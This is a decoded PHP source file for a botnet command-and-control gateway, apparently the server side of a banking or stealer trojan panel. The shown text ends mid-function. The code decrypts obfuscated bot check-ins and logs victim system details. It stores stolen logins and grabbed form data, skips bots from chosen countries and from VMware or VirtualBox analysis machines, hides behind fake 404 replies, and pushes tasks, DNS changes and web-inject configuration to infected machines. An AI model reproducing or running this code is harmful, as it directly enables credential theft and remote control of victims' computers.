<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

define("IN_BOT_GATEWAY", 1);
global $sqlDefault;
$bGotSettingsFromCache = false;
require_once "include/core.inc";
require_once "include/gateway_defines.inc";
require_once "include/gateway_functionality.inc";
error_reporting(0);
if ($sqlSettings->IsLoaded == true) {
    $bGotSettingsFromCache = true;
    _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_();
}
$botLogs = new CGrab();
$botClient = new CClient();
$botRequest = new CBotRequestPacket();
$botForms = new CFormGrab();
$request_header_version = 1500;
$response_header_version = 1800;
$g_dwRequest_Type = 0;
$g_dwResponse_StatusCode = BOT_RESPONSE_OK;
$g_dwPost_VarNamesExXorValue = 0;
$g_szPost_VarNamesName = "";
$g_szPost_KeyName = "";
$g_szPost_HeaderName = "";
$g_szPost_HeaderStringName = "";
$g_szPost_HeaderStringUserName = "";
$g_szPost_HeaderStringBrowserName = "";
$g_szPost_HeaderStringInstallName = "";
$g_szPost_HeaderStringCpuName = "";
$g_szPost_HeaderStringVideoName = "";
$g_szPost_HeaderStringProductIdName = "";
$g_szPost_HeaderStringsVariable = "";
$g_szPost_HeaderStringUser_Content = "";
$g_szPost_HeaderStringBrowser_Content = "";
$g_szPost_HeaderStringInstall_Content = "";
$g_szPost_HeaderStringCpu_Content = "";
$g_szPost_HeaderStringVideo_Content = "";
$g_szPost_HeaderStringProductId_Content = "";
$g_szBot_InstallPath = "";
$g_szBot_DefaultBrowser = "";
$g_szBot_Names = "";
$g_szBot_CpuName = "";
$g_szBot_VideoCardName = "";
$g_szBot_ProductId = "";
$g_szInfoBlob_ProcessList = "";
$g_szInfoBlob_InstalledSoftwareList = "";
$g_szInfoBlob_AutostartList = "";
$g_szInfoBlob_GenericList = "";
$g_szInfoBlob_DebugInfo = "";
$g_szPost_InfoBlobName = "";
$g_szInfoBlob_ProcessListName = "";
$g_szInfoBlob_InstalledSoftwareListName = "";
$g_szInfoBlob_AutostartListName = "";
$g_szInfoBlob_GenericListName = "";
$g_szInfoBlob_DebugInfoName = "";
$g_szPost_FormInfoName = "";
$g_szPost_FormInfoHostName = "";
$g_szPost_FormInfoProcessName = "";
$g_szPost_FormInfoContentName = "";
$g_szPost_FormInfoHeadersName = "";
$g_szPost_LoginInfoName = "";
$g_szPost_LoginCountName = "";
$g_szPost_TaskErrorReportName = "";
$g_btPost_FormXorKeys = NULL;
$g_btPost_LoginXorKeys = NULL;
$g_btPost_StringXorKeys = NULL;
$g_btPost_TaskErrorXorKeys = NULL;
$g_btPost_DynamicXorKeys = NULL;
$g_dwPost_LoginCountXorKey = 0;
$g_dwPost_LoginCountSubstrValue = 0;
$botVersions_Major = 0;
$botVersions_Minor = 0;
$botVersions_Revision = 0;
$botVersions_Build = 0;
$bShouldNotifyDelete = false;
$iFailReason = 0;
$_CLIENT_GEO_CODE2 = "";
$iSeed = (int) _obfuscated_0D37271A1212130E3F011E37122E110D072F020B2C0911_();
if ($iSeed != 0) {
    $response_header_version = 1700;
    $g_szPost_KeyName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 2);
    $g_szPost_HeaderName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 4);
    $g_szPost_HeaderStringName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 6);
    $g_szPost_FormInfoName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 8);
    $g_szPost_LoginInfoName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 10);
    $g_szPost_LoginCountName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 12);
    $g_szPost_TaskErrorReportName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 20);
    $g_szPost_InfoBlobName = _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iSeed + 30);
    $g_szPost_HeaderStringInstallName = $g_szPost_HeaderStringName . "1";
    $g_szPost_HeaderStringBrowserName = $g_szPost_HeaderStringName . "2";
    $g_szPost_HeaderStringUserName = $g_szPost_HeaderStringName . "3";
    $g_szPost_HeaderStringCpuName = $g_szPost_HeaderStringName . "4";
    $g_szPost_HeaderStringVideoName = $g_szPost_HeaderStringName . "5";
    $g_szPost_HeaderStringProductIdName = $g_szPost_HeaderStringName . "6";
    $g_szPost_FormInfoHostName = $g_szPost_FormInfoName . "1";
    $g_szPost_FormInfoContentName = $g_szPost_FormInfoName . "2";
    $g_szPost_FormInfoProcessName = $g_szPost_FormInfoName . "3";
    $g_szPost_FormInfoHeadersName = $g_szPost_FormInfoName . "4";
    $g_szInfoBlob_ProcessListName = $g_szPost_InfoBlobName . "1";
    $g_szInfoBlob_InstalledSoftwareListName = $g_szPost_InfoBlobName . "2";
    $g_szInfoBlob_AutostartListName = $g_szPost_InfoBlobName . "3";
    $g_szInfoBlob_GenericListName = $g_szPost_InfoBlobName . "4";
    $g_szInfoBlob_DebugInfoName = $g_szPost_InfoBlobName . "5";
    $g_btPost_FormXorKeys = array(129, 211, 187, 158);
    $g_btPost_LoginXorKeys = array(234, 55, 207, 93);
    $g_btPost_StringXorKeys = array(34, 240, 113, 194);
    $g_btPost_TaskErrorXorKeys = array(178, 143, 170, 28);
    $g_dwPost_LoginCountXorKey = BOT_REQUEST_LOGINS_COUNT_XOR_KEY_V17;
    $g_dwPost_LoginCountSubstrValue = 1;
} else {
    $response_header_version = 1500;
    $g_szPost_KeyName = BOT_REQUEST_POST_VAR_CRYPTKEY;
    $g_szPost_HeaderName = BOT_REQUEST_POST_VAR_HEADER;
    $g_szPost_HeaderStringName = BOT_REQUEST_STRING_DEFAULT;
    $g_szPost_FormInfoName = "";
    $g_szPost_LoginInfoName = "sl_";
    $g_szPost_LoginCountName = "slc";
    $g_szPost_HeaderStringInstallName = BOT_REQUEST_STRING_INSTALL_PATH;
    $g_szPost_HeaderStringBrowserName = BOT_REQUEST_STRING_DEFAULT_BROWSER;
    $g_szPost_HeaderStringUserName = BOT_REQUEST_STRING_COMPUSER_NAME;
    $g_szPost_FormInfoHostName = BOT_REQUEST_POST_FORMGRAB_HOST;
    $g_szPost_FormInfoProcessName = BOT_REQUEST_POST_FORMGRAB_HOST_PROCESS;
    $g_szPost_FormInfoContentName = BOT_REQUEST_POST_FORMGRAB_FORM_DATA;
    $g_szPost_FormInfoHeadersName = BOT_REQUEST_POST_FORMGRAB_FORM_HEADER_DATA;
    $g_btPost_FormXorKeys = array(75, 250, 194, 137);
    $g_btPost_LoginXorKeys = array(180, 8, 160, 248);
    $g_btPost_StringXorKeys = array(29, 204, 185, 234);
    $g_dwPost_LoginCountXorKey = BOT_REQUEST_LOGINS_COUNT_XOR_KEY;
    $g_dwPost_LoginCountSubstrValue = 0;
}
$g_szPost_HeaderStringUser_Content = isset($_POST[(string) $g_szPost_HeaderStringUserName]) ? $_POST[(string) $g_szPost_HeaderStringUserName] : "";
$g_szPost_HeaderStringBrowser_Content = isset($_POST[(string) $g_szPost_HeaderStringBrowserName]) ? $_POST[(string) $g_szPost_HeaderStringBrowserName] : "";
$g_szPost_HeaderStringInstall_Content = isset($_POST[(string) $g_szPost_HeaderStringInstallName]) ? $_POST[(string) $g_szPost_HeaderStringInstallName] : "";
$g_szPost_HeaderStringCpu_Content = "";
$g_szPost_HeaderStringVideo_Content = "";
$g_szPost_HeaderStringProductId_Content = "";
if (isset($_POST[(string) $g_szPost_HeaderStringCpuName]) && 2 <= strlen($_POST[(string) $g_szPost_HeaderStringCpuName])) {
    $g_szPost_HeaderStringCpu_Content = $_POST[(string) $g_szPost_HeaderStringCpuName];
}
if (isset($_POST[(string) $g_szPost_HeaderStringVideoName]) && 2 <= strlen($_POST[(string) $g_szPost_HeaderStringVideoName])) {
    $g_szPost_HeaderStringVideo_Content = $_POST[(string) $g_szPost_HeaderStringVideoName];
}
if (isset($_POST[(string) $g_szPost_HeaderStringProductIdName]) && 2 <= strlen($_POST[(string) $g_szPost_HeaderStringProductIdName])) {
    $g_szPost_HeaderStringProductId_Content = $_POST[(string) $g_szPost_HeaderStringProductIdName];
}
if (isset($_GET["action"])) {
    if ($_GET["action"] === "up") {
        require_once "files.php";
    } else {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
} else {
    if (isset($_POST[(string) $g_szPost_KeyName]) && isset($_POST[(string) $g_szPost_HeaderName])) {
        $szRequestHeaderKey = BOT_RESPONSE_HEADER_RC4_SALT . _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_POST[(string) $g_szPost_KeyName]);
        $szRequestHeader = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_POST[(string) $g_szPost_HeaderName]);
        if (1700 <= $response_header_version) {
            $szRequestHeaderKey = _obfuscated_0D11160D1D0C2E251D35310A151714250C1A330A161301_($szRequestHeaderKey, BOT_RESPONSE_HEADER_RC4_SALT_8BIT);
        }
        $iHeaderKeyLength = (int) strlen($szRequestHeaderKey);
        if ($iHeaderKeyLength == 0 || 256 < $iHeaderKeyLength) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(100, "Header and/or keys are invalid");
            header("HTTP/1.0 404 Not Found");
            exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
        }
        $client_request = $botRequest->DecryptClientRequest($szRequestHeader, $szRequestHeaderKey, $request_header_version);
        if ($client_request === NULL) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(101, "client_request = NULL");
            header("HTTP/1.0 404 Not Found");
            exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
        }
        $botClient->TranslateFromBotRequest($client_request);
        if ($botRequest->IsValidRequest($client_request, $iFailReason) == false) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(102, "IsValidRequest() = FALSE // Reason: " . $iFailReason);
            header("HTTP/1.0 404 Not Found");
            exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
        }
        $main_sql_link = $sqlDefault->Connect();
        if (!$main_sql_link) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(98, "SQL Conn. failed. Error#: " . mysql_errno());
            header("HTTP/1.0 404 Not Found");
            exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
        }
        $botForms->SetInternalLink($main_sql_link);
        $botClient->SetInternalLink($main_sql_link);
        $botLogs->SetInternalLink($main_sql_link);
        _obfuscated_0D2E030502393309353803265C180F1810281B0E1C1D22_($main_sql_link);
        if ($bGotSettingsFromCache == false) {
            _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_();
            $sqlSettings->GetSettings();
        }
        $g_dwRequest_Type = (int) $client_request["request_type"];
        $guid_length = (int) strlen($botClient->Machine_GUID);
        if ($guid_length < 14 || 16 < $guid_length) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(103, "GUID length is invalid (Recv: " . strlen($botClient->Machine_GUID) . " bytes, needed 16 bytes");
            header("HTTP/1.0 404 Not Found");
            exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
        }
        if (1801 <= $request_header_version) {
            _obfuscated_0D281916082D02045C170D172B3C26302B123C29153701_($client_request["request_type"]);
            $response_header_version = 1801;
        }
        if (isset($client_request["exdata_key"])) {
            $KeyArray = _obfuscated_0D3D05300B27300F1E0215180A325B0F5B40170C1E1411_((int) $client_request["exdata_key"]);
            $g_btPost_FormXorKeys = $KeyArray;
            $g_btPost_LoginXorKeys = $KeyArray;
            $g_btPost_StringXorKeys = $KeyArray;
            $g_btPost_TaskErrorXorKeys = $KeyArray;
            $g_btPost_DynamicXorKeys = $KeyArray;
        }
        $bot_record = $botClient->GetClientByGuidEx($botClient->Machine_GUID);
        $ttp_had_to_add = false;
        if ($g_dwRequest_Type == BOT_REQUEST_TYPE_SYSTEM_BOOT_CHECKIN) {
            $es_key = $g_btPost_StringXorKeys;
            if (6 < strlen($g_szPost_HeaderStringInstall_Content)) {
                $g_szBot_InstallPath = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringInstall_Content);
                $g_szBot_InstallPath = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_InstallPath, $es_key);
            } else {
                $g_szBot_InstallPath = "N/A";
            }
            if (3 < strlen($g_szPost_HeaderStringBrowser_Content)) {
                $g_szBot_DefaultBrowser = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringBrowser_Content);
                $g_szBot_DefaultBrowser = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_DefaultBrowser, $es_key);
            } else {
                $g_szBot_DefaultBrowser = "N/A";
            }
            if (1 < strlen($g_szPost_HeaderStringUser_Content)) {
                $g_szBot_Names = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringUser_Content);
                $g_szBot_Names = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_Names, $es_key);
            } else {
                $g_szBot_Names = "N/A";
            }
            if (6 < strlen($g_szPost_HeaderStringCpu_Content)) {
                $g_szBot_CpuName = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringCpu_Content);
                $g_szBot_CpuName = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_CpuName, $es_key);
            } else {
                $g_szBot_CpuName = "N/A";
            }
            if (4 < strlen($g_szPost_HeaderStringVideo_Content)) {
                $g_szBot_VideoCardName = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringVideo_Content);
                $g_szBot_VideoCardName = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_VideoCardName, $es_key);
            } else {
                $g_szBot_VideoCardName = "N/A";
            }
            if (16 < strlen($g_szPost_HeaderStringProductId_Content)) {
                $g_szBot_ProductId = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($g_szPost_HeaderStringProductId_Content);
                $g_szBot_ProductId = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($g_szBot_ProductId, $es_key);
            } else {
                $g_szBot_ProductId = "N/A";
            }
            $g_szBot_InstallPath = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_InstallPath);
            $g_szBot_DefaultBrowser = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_DefaultBrowser);
            $g_szBot_Names = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_Names);
            $g_szBot_CpuName = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_CpuName);
            $g_szBot_VideoCardName = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_VideoCardName);
            $g_szBot_ProductId = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($g_szBot_ProductId);
            $botClient->Bot_InstallPath = $g_szBot_InstallPath;
            $botClient->Bot_DefaultBrowser = $g_szBot_DefaultBrowser;
            $botClient->Bot_Names = $g_szBot_Names;
            $botClient->Bot_CpuName = $g_szBot_CpuName;
            $botClient->Bot_VideoCardName = $g_szBot_VideoCardName;
            $botClient->Bot_ProductId = $g_szBot_ProductId;
        }
        if (!$bot_record) {
            if ($g_dwRequest_Type == BOT_REQUEST_TYPE_SYSTEM_BOOT_CHECKIN) {
                $_CLIENT_GEO_INFO = $sqlGeoIP->GetIpLocation($_SERVER["REMOTE_ADDR"]);
                if (isset($_CLIENT_GEO_INFO["COUNTRY_CODE2"])) {
                    $botClient->Bot_Locale = $_CLIENT_GEO_INFO["COUNTRY_CODE2"];
                    if (isset($_CLIENT_GEO_INFO["COUNTRY_NAME"])) {
                        $botClient->Bot_LocaleName = $_CLIENT_GEO_INFO["COUNTRY_NAME"];
                    }
                    if (1 < strlen($sqlSettings->Ignored_Locales) && strlen($botClient->Bot_Locale) == 2 && stripos($sqlSettings->Ignored_Locales, $botClient->Bot_Locale) !== false) {
                        header("HTTP/1.0 404 Not Found");
                        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
                    }
                }
                if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_IGNORE_COMMS_VM) {
                    $vcard_ansi = str_replace("", "", $botClient->Bot_VideoCardName);
                    if (7 < strlen($vcard_ansi) && (stripos($vcard_ansi, "VMware") !== false || stripos($vcard_ansi, "VirtualBox") !== false)) {
                        header("HTTP/1.0 404 Not Found");
                        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
                    }
                }
                if (0 <= ($botClient->Bot_RecordID = $botClient->AddClient($botClient))) {
                    $ttp_had_to_add = true;
                    $g_dwResponse_StatusCode = BOT_RESPONSE_OK;
                } else {
                    _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(104, "AddClient() failed");
                    $g_dwResponse_StatusCode = BOT_RESPONSE_FAILED;
                }
            } else {
                $g_dwResponse_StatusCode = BOT_RESPONSE_NOT_FOUND_RESUBMIT;
            }
        } else {
            $botClient->TranslateFromSqlRecord($bot_record);
            try {
                if ((int) $botClient->Bot_Status === BOT_STATUS_DELETED && (int) $botClient->Bot_Attributes === BOT_DISPOSITION_UNINSTALL_SELF) {
                    $bShouldNotifyDelete = true;
                }
            } catch (MyException $e) {
            }
            if (@ip2long($_SERVER["REMOTE_ADDR"]) != (int) $bot_record["LastIP"]) {
                $_CLIENT_GEO_INFO = $sqlGeoIP->GetIpLocation($_SERVER["REMOTE_ADDR"]);
                if (isset($_CLIENT_GEO_INFO["COUNTRY_CODE2"])) {
                    $botClient->Bot_Locale = $_CLIENT_GEO_INFO["COUNTRY_CODE2"];
                    if (isset($_CLIENT_GEO_INFO["COUNTRY_NAME"])) {
                        $botClient->Bot_LocaleName = $_CLIENT_GEO_INFO["COUNTRY_NAME"];
                    }
                }
            } else {
                $botClient->Bot_Locale = $bot_record["Locale"];
                $botClient->Bot_LocaleName = $bot_record["LocaleName"];
            }
            if (1 < strlen($sqlSettings->Ignored_Locales) && strlen($botClient->Bot_Locale) == 2 && stripos($sqlSettings->Ignored_Locales, $botClient->Bot_Locale) !== false) {
                header("HTTP/1.0 404 Not Found");
                exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
            }
            if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_IGNORE_COMMS_VM) {
                $vcard_ansi = str_replace("", "", $botClient->Bot_VideoCardName);
                if (7 < strlen($vcard_ansi) && (stripos($vcard_ansi, "VMware") !== false || stripos($vcard_ansi, "VirtualBox") !== false)) {
                    header("HTTP/1.0 404 Not Found");
                    exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
                }
            }
        }
        if ($botClient->Bot_Version_Major == 1 && $botClient->Bot_Version_Minor == 8 && 0 < $botClient->Bot_Version_Build && $botClient->Bot_Version_Build < 5) {
            $response_header_version = 1801;
        }
        if (1 < $botClient->Bot_Version_Major || $botClient->Bot_Version_Major == 1 && 8 < $botClient->Bot_Version_Minor || $botClient->Bot_Version_Major == 1 && $botClient->Bot_Version_Minor == 8 && 6 <= $botClient->Bot_Version_Build) {
            $response_header_version = 1806;
        }
        $botClient->TranslateFromBotRequest($client_request);
        if ($bShouldNotifyDelete == false && $g_dwResponse_StatusCode != BOT_RESPONSE_NOT_FOUND_RESUBMIT) {
            if ($g_dwRequest_Type == BOT_REQUEST_TYPE_STEALER_DATA) {
                $botLogs->ParseAndAddGrabbedLogins($botClient->Machine_GUID, $botClient->Bot_RecordID);
            } else {
                if ($g_dwRequest_Type == BOT_REQUEST_TYPE_FORMGRAB_DATA) {
                    $botForms->ParseAndAddGrabbedFormData($botClient, $botClient->Machine_GUID, $botClient->Bot_RecordID);
                }
            }
        }
        $response_data = "";
        $hdr_StatusCode = $g_dwResponse_StatusCode;
        $hdr_ContentType = 0;
        $hdr_GeneralOptions = (int) $sqlSettings->Flags_General;
        $hdr_MinorOptions = (int) $sqlSettings->Flags_Minor;
        $hdr_CustomOptions = (int) $sqlSettings->Flags_Custom;
        $hdr_InfoBlobStatus = (int) $sqlSettings->Flags_Blobs;
        $hdr_KnockInterval = (int) $sqlSettings->KnockInterval;
        $hdr_Disposition = 0;
        $hdr_ext_cmds_size = 0;
        $hdr_ext_dns_size = 0;
        $hdr_ext_tracked_urls_size = 0;
        $hdr_ext_dyn_config_size = 0;
        $hdr_ext_filesearch_config_size = 0;
        $hdr_ext_plugins_config_size = 0;
        $hdr_ext_web_config_size = 0;
        $hdr_extended_data = "";
        if ($bShouldNotifyDelete === true) {
            $hdr_Disposition = BOT_DISPOSITION_UNINSTALL_SELF;
            $hdr_StatusCode = BOT_RESPONSE_OK_PROCESS_DISPOSITION;
        }
        $respCmds = new CBotCommands();
        $bb_last_task = 0;
        if ($bShouldNotifyDelete == false) {
            if ($g_dwResponse_StatusCode != BOT_RESPONSE_NOT_FOUND_RESUBMIT) {
                $tmp_data = $sqlTasks->GetTasksForBot($botClient, $bb_last_task, $g_dwRequest_Type);
                $hdr_extended_data .= $tmp_data;
                $hdr_ext_cmds_size = strlen($tmp_data);
            } else {
                $tmp_data = "";
                $hdr_extended_data = NULL;
                $hdr_ext_cmds_size = 0;
            }
            if ($ttp_had_to_add == false && $g_dwResponse_StatusCode != BOT_RESPONSE_NOT_FOUND_RESUBMIT) {
                if ($g_dwRequest_Type == BOT_REQUEST_TYPE_SYSTEM_BOOT_CHECKIN) {
                    $botClient->Bot_InstallPath = $g_szBot_InstallPath;
                    $botClient->Bot_DefaultBrowser = $g_szBot_DefaultBrowser;
                    $botClient->Bot_Names = $g_szBot_Names;
                    $botClient->Bot_CpuName = $g_szBot_CpuName;
                    $botClient->Bot_VideoCardName = $g_szBot_VideoCardName;
                    $botClient->Bot_ProductId = $g_szBot_ProductId;
                } else {
                    if ($g_dwRequest_Type == BOT_REQUEST_TYPE_UPDATE_INFOBLOBS) {
                        $dwNumBlobs = _obfuscated_0D3E2D15141B34243702070C0C0605245C1E2B3E344032_($botClient);
                    }
                }
                $botClient->UpdateClient_CheckIn($botClient, $bb_last_task, $g_dwRequest_Type);
            }
            if ((int) $botClient->TaskID_1 != 0 && (int) $botClient->TaskID_StatusFlags_1 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_1, $botClient->TaskID_StatusFlags_1);
            }
            if ((int) $botClient->TaskID_2 != 0 && (int) $botClient->TaskID_StatusFlags_2 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_2, $botClient->TaskID_StatusFlags_2);
            }
            if ((int) $botClient->TaskID_3 != 0 && (int) $botClient->TaskID_StatusFlags_3 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_3, $botClient->TaskID_StatusFlags_3);
            }
            if ((int) $botClient->TaskID_4 != 0 && (int) $botClient->TaskID_StatusFlags_4 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_4, $botClient->TaskID_StatusFlags_4);
            }
            if ((int) $botClient->TaskID_5 != 0 && (int) $botClient->TaskID_StatusFlags_5 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_5, $botClient->TaskID_StatusFlags_5);
            }
            if ((int) $botClient->TaskID_6 != 0 && (int) $botClient->TaskID_StatusFlags_6 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_6, $botClient->TaskID_StatusFlags_6);
            }
            if ((int) $botClient->TaskID_7 != 0 && (int) $botClient->TaskID_StatusFlags_7 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_7, $botClient->TaskID_StatusFlags_7);
            }
            if ((int) $botClient->TaskID_8 != 0 && (int) $botClient->TaskID_StatusFlags_8 != 0) {
                $sqlTasks->SetTaskCompletionStatusAndUpdateTaskErrorCount($botClient->Bot_RecordID, $botClient->TaskID_8, $botClient->TaskID_StatusFlags_8);
            }
        }
        _obfuscated_0D232209031D251F0E221513190F263516272B262A0801_($botClient);
        $hdr_GeneralOptions &= ~GENERAL_FLAGS_DNS_MODIFY_DISABLED;
        $hdr_MinorOptions &= ~MINOR_FLAGS_INSTALL_ENABLE_SHELL_FOLDER;
        if ($g_dwResponse_StatusCode != BOT_RESPONSE_NOT_FOUND_RESUBMIT) {
            if ((int) $client_request["cfg_versions_dns_blocklist"] != $sqlSettings->DnsList_Version) {
                $tmp_data = "";
                if ($mCache->IsInitialized()) {
                    $tmp_data = $mCache->Get(CACHE_CONFIG_DNS_MODIFIERS);
                    if (!$tmp_data || @strlen($tmp_data) < 1) {
                        $tmp_data = _obfuscated_0D0124241A212F141D3006082423275B2E0A5C08013901_();
                        if (strlen($tmp_data)) {
                            $mCache->Set(CACHE_CONFIG_DNS_MODIFIERS, $tmp_data);
                        }
                    }
                } else {
                    $tmp_data = _obfuscated_0D0124241A212F141D3006082423275B2E0A5C08013901_();
                }
                $hdr_ext_dns_size = @strlen($tmp_data);
                if (0 < $hdr_ext_dns_size) {
                    $hdr_extended_data .= $tmp_data;
                }
            }
            if ((int) $client_request["cfg_versions_url_tracklist"] != $sqlSettings->UrlTrack_Version) {
                $tmp_data = "";
                if ($mCache->IsInitialized()) {
                    $tmp_data = $mCache->Get(CACHE_CONFIG_URL_TRACK_LIST);
                    if (!$tmp_data || @strlen($tmp_data) < 1) {
                        $tmp_data = _obfuscated_0D090502080B2D0E061301121E141926063D382A151911_();
                        if (strlen($tmp_data)) {
                            $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, $tmp_data);
                        }
                    }
                } else {
                    $tmp_data = _obfuscated_0D090502080B2D0E061301121E141926063D382A151911_();
                }
                $hdr_ext_tracked_urls_size = @strlen($tmp_data);
                if (0 < $hdr_ext_tracked_urls_size) {
                    $hdr_extended_data .= $tmp_data;
                }
            }
            if ((int) $client_request["cfg_versions_config"] != $sqlSettings->DynamicConfig_Version) {
                $tmp_data = "";
                if ($mCache->IsInitialized()) {
                    $tmp_data = $mCache->Get(CACHE_CONFIG_DYNAMIC_CONFIG);
                    if (!$tmp_data || @strlen($tmp_data) < 1) {
                        $tmp_data = _obfuscated_0D28403B3D142D363F0B2840213636010913012B5C0E32_();
                        if (strlen($tmp_data)) {
                            $mCache->Set(CACHE_CONFIG_DYNAMIC_CONFIG, $tmp_data);
                        }
                    }
                } else {
                    $tmp_data = _obfuscated_0D28403B3D142D363F0B2840213636010913012B5C0E32_();
                }
                $hdr_ext_dyn_config_size = @strlen($tmp_data);
                if (0 < $hdr_ext_dyn_config_size) {
                    $hdr_extended_data .= $tmp_data;
                }
            }
            if ((int) $client_request["cfg_versions_filesearch"] != $sqlSettings->FileSearch_Version) {
                $tmp_data = "";
                if ($mCache->IsInitialized()) {
                    $tmp_data = $mCache->Get(CACHE_CONFIG_FILE_SEARCH);
                    if (!$tmp_data || @strlen($tmp_data) < 1) {
                        $tmp_data = _obfuscated_0D2E070C1B40170F1E07401F1D401A032C340B1C211B22_();
                        if (strlen($tmp_data)) {
                            $mCache->Set(CACHE_CONFIG_FILE_SEARCH, $tmp_data);
                        }
                    }
                } else {
                    $tmp_data = _obfuscated_0D2E070C1B40170F1E07401F1D401A032C340B1C211B22_();
                }
                $hdr_ext_filesearch_config_size = @strlen($tmp_data);
                if (0 < $hdr_ext_filesearch_config_size) {
                    $hdr_extended_data .= $tmp_data;
                }
            }
            if (!isset($client_request["cfg_versions_plugins"]) || (int) $client_request["cfg_versions_plugins"] != $sqlSettings->Plugins_Version) {
            }
            if ($hdr_CustomOptions & CUSTOM_FLAGS_DISABLE_WEB) {
                $hdr_extended_data .= "clr";
                $hdr_ext_web_config_size = 3;
            } else {
                if ((int) $client_request["cfg_versions_web"] != $sqlSettings->Web_Version) {
                    $tmp_data = "";
                    if ($mCache->IsInitialized()) {
                        $tmp_data = $mCache->Get(CACHE_CONFIG_WEB);
                        if (!$tmp_data || @strlen($tmp_data) < 2) {
                            $tmp_data = _obfuscated_0D2E28340234062E5C2C0128040723271F2B2B2E102B01_();
                            if (strlen($tmp_data)) {
                                $mCache->Set(CACHE_CONFIG_WEB, $tmp_data);
                            }
                        }
                    } else {
                        $tmp_data = _obfuscated_0D2E28340234062E5C2C0128040723271F2B2B2E102B01_();
                    }
                    $hdr_ext_web_config_size = @strlen($tmp_data);
                    if (0 < $hdr_ext_web_config_size) {
                        $hdr_extended_data .= $tmp_data;
                    }
                }
            }
        }
        if (!@file_exists($dyn_config_filename)) {
            $hdr_GeneralOptions |= BOT_STATUS_FLAG_DYNAMIC_CONFIG_DISABLED;
        }
        $rnd_mm_header = @mt_rand(0, @getrandmax());
        $rnd_mm_exdata = @mt_rand(0, @getrandmax());
        @mt_srand(@time());
        if ($response_header_version <= 1500) {
            $jpeg_header = @pack(BB_JPEG_HEADER, 65496, @mt_rand(1, 2200), @mt_rand(1, 2200), @mt_rand(1, 18), @mt_rand(2, 59), @mt_rand(1, 38), @mt_rand(3, 15));
        }
